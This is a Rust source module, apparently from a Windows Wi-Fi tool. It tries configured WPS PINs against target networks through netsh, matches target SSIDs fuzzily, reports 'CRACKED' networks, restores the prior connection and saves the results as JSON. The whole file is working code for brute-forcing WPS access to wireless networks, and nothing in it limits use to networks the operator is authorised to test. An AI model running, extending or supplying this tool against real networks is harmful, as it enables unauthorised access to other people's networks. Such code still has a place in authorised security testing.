//! WPS PIN probe: try `netsh wlan connect name=<ssid> auth=wpspin key=<pin>`.
//! Supports partial target matching (split target on - _), restores connection after.

use anyhow::Result;
use serde::Serialize;
use std::time::{Duration, Instant};

use crate::config::WpsCfg;
use crate::netsh;

#[derive(Debug, Clone, Serialize)]
pub struct PinAttempt {
    pub pin: String,
    pub success: bool,
    pub info: String,
}

#[derive(Debug, Clone, Serialize, Default)]
pub struct TargetResult {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub found: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub matched_ssid: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub pins_tried: Option<Vec<PinAttempt>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cracked: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub password: Option<String>,
}

#[derive(Debug, Clone, Serialize, Default)]
pub struct WpsResults {
    pub targets: std::collections::BTreeMap<String, TargetResult>,
}

/// Try one PIN against one SSID within a wall-clock window.
fn try_wps_pin(ssid: &str, pin: &str, timeout: Duration) -> (bool, String) {
    let t0 = Instant::now();
    while t0.elapsed() < timeout {
        let out = match netsh::connect_wpspin(ssid, pin) {
            Ok(o) => o,
            Err(e) => return (false, format!("error: {}", e)),
        };
        if out.ok() {
            tracing::info!("wps: netsh OK: {}", out.stdout.trim());
            std::thread::sleep(Duration::from_secs(4));
            if let Ok(iface) = netsh::show_interface() {
                if iface.ssid.as_deref() == Some(ssid) {
                    tracing::info!("wps: SUCCESS connected to {} with PIN {}", ssid, pin);
                    return (true, "connected".into());
                }
            }
        }
        std::thread::sleep(Duration::from_secs(2));
    }
    (false, "timeout".into())
}

/// Find the visible SSID matching a target: exact / substring / token-based.
fn find_match(target: &str, nets: &[netsh::NetworkInfo]) -> Option<String> {
    // 1. exact or containment
    for n in nets {
        let s = &n.ssid;
        if s == target || s.to_lowercase().contains(&target.to_lowercase()) {
            return Some(s.clone());
        }
    }
    // 2. token fallback: split target on - and _, each part >= 2 chars
    let tokens: Vec<String> = regex::Regex::new(r"[-_]")
        .unwrap()
        .split(target)
        .filter(|p| p.chars().count() >= 2)
        .map(|p| p.to_lowercase())
        .collect();
    for n in nets {
        let lower = n.ssid.to_lowercase();
        if tokens.iter().any(|t| lower.contains(t)) {
            return Some(n.ssid.clone());
        }
    }
    None
}

/// Run the probe over all targets.
pub fn probe(cfg: &WpsCfg, targets: &[String]) -> Result<WpsResults> {
    let restore_ssid = netsh::show_interface()?.ssid.unwrap_or_default();
    tracing::info!(
        "wps: probe targets={:?} pins={:?} (restore to {:?})",
        targets,
        cfg.pins,
        restore_ssid
    );

    let mut results = WpsResults::default();

    for target in targets {
        let mut tr = TargetResult::default();
        // Active-scan refresh first: while connected the cached list is stale.
        let nets = crate::scan::flyout_refresh(4)?;
        match find_match(target, &nets) {
            None => {
                let visible: Vec<String> = nets.iter().map(|n| n.ssid.clone()).collect();
                tracing::info!(
                    "wps: [{}] not visible among {} networks: {:?}...",
                    target,
                    nets.len(),
                    &visible[..visible.len().min(5)]
                );
                tr.found = Some(false);
            }
            Some(matched) => {
                let info = nets.iter().find(|n| n.ssid == matched);
                tracing::info!(
                    "wps: [{}] -> {:?} (bssid={:?} ch={:?})",
                    target,
                    matched,
                    info.and_then(|i| i.bssid.clone()),
                    info.and_then(|i| i.channel.clone())
                );
                tr.found = Some(true);
                tr.matched_ssid = Some(matched.clone());

                let mut pins_tried = Vec::new();
                let mut cracked = false;
                for pin in &cfg.pins {
                    let (ok, info) =
                        try_wps_pin(&matched, pin, Duration::from_secs(cfg.timeout_sec));
                    pins_tried.push(PinAttempt { pin: pin.clone(), success: ok, info });
                    if ok {
                        cracked = true;
                        // WPS gives connectivity, not the password directly.
                        tr.password = Some("(wps-connected; password unknown)".into());
                        break;
                    }
                    // Restore between pins so the next connect isn't blocked
                    if !restore_ssid.is_empty() {
                        let _ = netsh::connect(&restore_ssid);
                        std::thread::sleep(Duration::from_secs(2));
                    }
                }
                tr.pins_tried = Some(pins_tried);
                tr.cracked = Some(cracked);
            }
        }
        results.targets.insert(target.clone(), tr);

        // Restore after each target
        let iface = netsh::show_interface()?;
        if let Some(cur) = &iface.ssid {
            if !restore_ssid.is_empty() && cur != &restore_ssid {
                tracing::info!("wps: restoring to {} ...", restore_ssid);
                let _ = netsh::connect(&restore_ssid);
                std::thread::sleep(Duration::from_secs(4));
            }
        }
    }

    for (t, r) in &results.targets {
        let status = if r.cracked == Some(true) {
            "CRACKED"
        } else if r.found == Some(false) {
            "not found"
        } else {
            "no WPS"
        };
        tracing::info!("wps: {}: {}", t, status);
    }
    Ok(results)
}

/// Save results JSON to logs/wps_results.json.
pub fn save_result(res: &WpsResults, logs_dir: &std::path::Path) -> Result<()> {
    let path = logs_dir.join("wps_results.json");
    let json = serde_json::to_string_pretty(res)?;
    std::fs::write(&path, json)?;
    tracing::info!("wps: results -> {}", path.display());
    Ok(())
}
